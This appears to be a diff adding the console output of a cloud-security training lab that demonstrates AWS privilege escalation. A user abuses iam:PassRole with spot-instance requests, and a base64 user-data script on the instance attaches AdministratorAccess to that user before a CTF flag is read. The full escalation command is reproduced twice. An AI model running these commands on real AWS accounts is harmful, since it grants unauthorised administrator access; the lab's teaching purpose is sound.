@@ -1,0 +1,135 @@
+[0;32m========================================[0m
+[0;32mIAM PassRole + EC2 RequestSpotInstances Privilege Escalation Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-prod-ec2-004-to-admin-starting-user
+Access Key ID: AKIA2E4JP2...
+ReadOnly Key ID: AKIA2E4JP2...
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+  Denied helpful permissions on user: pl-prod-ec2-004-to-admin-starting-user
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Verifying starting user credentials[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-prod-ec2-004-to-admin-starting-user
+[0;32m✓ Verified starting user identity[0m
+
+[1;33mStep 3: Getting account ID[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Account ID: 123456789012
+[0;32m✓ Retrieved account ID[0m
+
+[1;33mStep 4: Verifying we don't have admin permissions yet[0m
+Attempting to list IAM users (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 5: Preparing EC2 user-data script to grant admin access[0m
+This script will attach AdministratorAccess policy to the starting user
+[0;32m✓ User-data script prepared[0m
+
+[1;33mStep 6: Finding Amazon Linux 2023 AMI[0m
+[2m[ReadOnly] $ aws ec2 describe-images --region us-east-1 --owners amazon --filters Name=name,Values=al2023-ami-2023.*-x86_64 Name=state,Values=available --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text[0m
+Using AMI: ami-0eb38b817b93460ac
+[0;32m✓ Found AMI[0m
+
+[1;33mStep 7: Determining VPC and subnet for spot instance[0m
+[2m[ReadOnly] $ aws ec2 --region us-east-1 describe-vpcs --filters Name=is-default,Values=true --query 'Vpcs[0].VpcId' --output text[0m
+[2m[ReadOnly] $ aws --region us-east-1 ec2 describe-subnets --filters Name=vpc-id,Values=vpc-07cc4566bb68bbae0 --query 'Subnets[0].SubnetId' --output text[0m
+Using VPC: vpc-07cc4566bb68bbae0
+Using Subnet: subnet-0e9df0a658d1fd567
+Using Region: us-east-1
+[0;32m✓ Network configuration ready[0m
+
+[1;33mStep 8: Preparing spot instance launch specification[0m
+[0;32m✓ Launch specification prepared[0m
+
+[1;33mStep 9: Requesting spot instance with admin instance profile[0m
+This is the privilege escalation vector - passing the admin role to a spot instance...
+Instance profile: pl-prod-ec2-004-to-admin-instance-profile
+
+[0;36m[Attacker] $ aws ec2 request-spot-instances --region us-east-1 --spot-price 0.05 --instance-count 1 --type one-time --launch-specification { "ImageId": "ami-0eb38b817b93460ac", "InstanceType": "t3.micro", "IamInstanceProfile": { "Name": "pl-prod-ec2-004-to-admin-instance-profile" }, "UserData": "IyEvYmluL2Jhc2gKZXhlYyA+ID4odGVlIC92YXIvbG9nL3VzZXItZGF0YS5sb2d8bG9nZ2VyIC10IHVzZXItZGF0YSAtcyAyPi9kZXYvY29uc29sZSkgMj4mMQplY2hvICJTdGFydGluZyBwcml2aWxlZ2UgZXNjYWxhdGlvbiBzY3JpcHQuLi4iCgpTVEFSVElOR19VU0VSX05BTUU9InBsLXByb2QtZWMyLTAwNC10by1hZG1pbi1zdGFydGluZy11c2VyIgoKIyBXYWl0IGZvciBJQU0gcm9sZSB0byBiZSBhdmFpbGFibGUKc2xlZXAgMTUKCiMgQXR0YWNoIEFkbWluaXN0cmF0b3JBY2Nlc3MgcG9saWN5IHRvIHRoZSBzdGFydGluZyB1c2VyCmF3cyBpYW0gYXR0YWNoLXVzZXItcG9saWN5ICAgLS11c2VyLW5hbWUgJFNUQVJUSU5HX1VTRVJfTkFNRSAgIC0tcG9saWN5LWFybiBhcm46YXdzOmlhbTo6YXdzOnBvbGljeS9BZG1pbmlzdHJhdG9yQWNjZXNzCgplY2hvICJBZG1pbmlzdHJhdG9yQWNjZXNzIGF0dGFjaGVkIHRvICRTVEFSVElOR19VU0VSX05BTUUgc3VjY2Vzc2Z1bGx5Igo=", "NetworkInterfaces": [ { "DeviceIndex": 0, "SubnetId": "subnet-0e9df0a658d1fd567", "AssociatePublicIpAddress": true } ] } --output json[0m
+Spot Instance Request ID: sir-bmxqfq6p
+[0;32m✓ Spot instance request submitted[0m
+
+[1;33mStep 10: Waiting for spot request to be fulfilled[0m
+This may take 1-2 minutes...
+
+[2m[ReadOnly] $ aws ec2 describe-spot-instance-requests --region us-east-1 --spot-instance-request-ids sir-bmxqfq6p --query 'SpotInstanceRequests[0]' --output json[0m
+.[2m[ReadOnly] $ aws ec2 describe-spot-instance-requests --region us-east-1 --spot-instance-request-ids sir-bmxqfq6p --query 'SpotInstanceRequests[0]' --output json[0m
+
+[0;32m✓ Spot request fulfilled! Instance ID: i-07b97b1533b400aaa[0m
+
+
+[1;33mStep 11: Waiting for user-data script to attach AdministratorAccess[0m
+This may take 2-3 minutes while the instance starts and executes the script...
+
+..[0;32m✓ Policy attachment complete! AdministratorAccess attached to starting user[0m
+
+
+[1;33mStep 12: Verifying administrator access[0m
+Waiting 15 seconds for IAM policy propagation...
+The starting user now has AdministratorAccess attached...
+Attempting to list IAM users with starting user credentials...
+[2m[Attacker (now admin)] $ aws iam list-users --max-items 3 --output table[0m
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|                                                                                    ListUsers                                                                                   |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+|  NextToken                 |  eyJNYXJrZXIiOiBudWxsLCAiYm90b190cnVuY2F0ZV9hbW91bnQiOiAzfQ==                                                                                     |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+||                                                                                     Users                                                                                    ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||                             Arn                             |      CreateDate       |   PasswordLastUsed    | Path  |        UserId          |           UserName            ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582225 |  2026-03-03T23:57:05Z |                       |  /    |  AIDA2E4JP2KMDN764OVDX |  pathrunner-admin-1772582225  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582487 |  2026-03-04T00:01:27Z |                       |  /    |  AIDA2E4JP2KMIGZOBA63O |  pathrunner-admin-1772582487  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582552 |  2026-03-04T00:02:32Z |  2026-03-04T00:04:42Z |  /    |  AIDA2E4JP2KMGNBJR4AJO |  pathrunner-admin-1772582552  ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+[0;32m✓ Successfully listed IAM users![0m
+[0;32m✓ ADMIN ACCESS CONFIRMED[0m
+
+[1;33mStep 13: Capturing CTF flag from SSM Parameter Store[0m
+
+[0;36m[Attacker (now admin)] $ aws ssm get-parameter --name /pathfinding-labs/flags/ec2-004-to-admin --query 'Parameter.Value' --output text[0m
+[0;32m✓ Flag captured: flag{ec2_004_admin_captured}[0m
+
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-prod-ec2-004-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-ec2-004-to-admin-starting-user (with iam:PassRole + ec2:RequestSpotInstances)
+2. Requested spot instance with admin instance profile (pl-prod-ec2-004-to-admin-target-role)
+3. Spot instance attached AdministratorAccess policy to starting user via user-data
+4. Achieved: Administrator Access (directly on starting user)
+5. Captured CTF flag from SSM Parameter Store: flag{ec2_004_admin_captured}
+
+[1;33mAttack Path:[0m
+  pl-prod-ec2-004-to-admin-starting-user → (PassRole + RequestSpotInstances) → Spot Instance with pl-prod-ec2-004-to-admin-target-role
+  → (AttachUserPolicy AdministratorAccess) → pl-prod-ec2-004-to-admin-starting-user → Admin
+  → (ssm:GetParameter) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws ec2 request-spot-instances --region us-east-1 --spot-price 0.05 --instance-count 1 --type one-time --launch-specification { "ImageId": "ami-0eb38b817b93460ac", "InstanceType": "t3.micro", "IamInstanceProfile": { "Name": "pl-prod-ec2-004-to-admin-instance-profile" }, "UserData": "IyEvYmluL2Jhc2gKZXhlYyA+ID4odGVlIC92YXIvbG9nL3VzZXItZGF0YS5sb2d8bG9nZ2VyIC10IHVzZXItZGF0YSAtcyAyPi9kZXYvY29uc29sZSkgMj4mMQplY2hvICJTdGFydGluZyBwcml2aWxlZ2UgZXNjYWxhdGlvbiBzY3JpcHQuLi4iCgpTVEFSVElOR19VU0VSX05BTUU9InBsLXByb2QtZWMyLTAwNC10by1hZG1pbi1zdGFydGluZy11c2VyIgoKIyBXYWl0IGZvciBJQU0gcm9sZSB0byBiZSBhdmFpbGFibGUKc2xlZXAgMTUKCiMgQXR0YWNoIEFkbWluaXN0cmF0b3JBY2Nlc3MgcG9saWN5IHRvIHRoZSBzdGFydGluZyB1c2VyCmF3cyBpYW0gYXR0YWNoLXVzZXItcG9saWN5ICAgLS11c2VyLW5hbWUgJFNUQVJUSU5HX1VTRVJfTkFNRSAgIC0tcG9saWN5LWFybiBhcm46YXdzOmlhbTo6YXdzOnBvbGljeS9BZG1pbmlzdHJhdG9yQWNjZXNzCgplY2hvICJBZG1pbmlzdHJhdG9yQWNjZXNzIGF0dGFjaGVkIHRvICRTVEFSVElOR19VU0VSX05BTUUgc3VjY2Vzc2Z1bGx5Igo=", "NetworkInterfaces": [ { "DeviceIndex": 0, "SubnetId": "subnet-0e9df0a658d1fd567", "AssociatePublicIpAddress": true } ] } --output json[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/ec2-004-to-admin --query 'Parameter.Value' --output text[0m
+
+[1;33mAttack Artifacts:[0m
+- Spot Instance Request: sir-bmxqfq6p
+- Spot Instance: i-07b97b1533b400aaa
+- AdministratorAccess policy attached to: pl-prod-ec2-004-to-admin-starting-user
+
+[0;31m⚠ Warning: AdministratorAccess policy has been attached to the starting user[0m
+[0;31m⚠ The spot instance is still running and incurring charges[0m
+
+[1;33mTo clean up and restore the original state:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
